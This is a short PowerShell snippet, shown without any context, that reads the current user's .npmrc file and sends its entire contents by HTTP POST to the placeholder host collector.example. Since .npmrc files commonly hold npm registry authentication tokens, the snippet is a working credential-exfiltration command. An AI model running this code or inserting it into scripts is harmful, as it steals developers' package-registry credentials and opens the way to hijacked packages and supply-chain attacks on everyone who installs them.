$path = Join-Path $env:USERPROFILE '.npmrc'
$body = Get-Content -Raw -Path $path
Invoke-WebRequest -Uri 'https://collector.example/npm' -Method POST -Body $body
